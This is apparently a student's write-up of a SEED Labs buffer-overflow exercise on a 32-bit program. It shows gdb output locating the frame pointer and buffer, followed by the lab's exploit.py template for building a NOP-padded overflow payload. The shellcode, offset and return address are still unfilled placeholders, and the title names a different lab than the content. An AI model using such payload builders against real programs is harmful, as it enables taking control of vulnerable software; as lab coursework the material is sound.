# SEEDlabs: Environment Variable and Set-UID Program Lab

#### Ozgur Ural
#### Student ID: 2564455


## Launching Attack on 32-bit Program (Level 1)

1. gdb stack-L1-dbg - Get the address of the bof function and the address of the buffer.

```sh
gdb-peda$ print $ebp
$1 = (void *) 0xffffcb08
gdb-peda$ print $buffer
$2 = (char (*)[100]) 0xffffca9c
```

2. Created badfile file. 
3. Modified the exploit.py file:

```c
#!/usr/bin/python3
import sys
shellcode= (
"" # ✩ Need to change ✩
).encode(’latin-1’)
# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))
##################################################################
# Put the shellcode somewhere in the payload
start = 0 # ✩ Need to change ✩
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret = 0x00 # ✩ Need to change ✩
offset = 0 # ✩ Need to change ✩
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
##################################################################
```
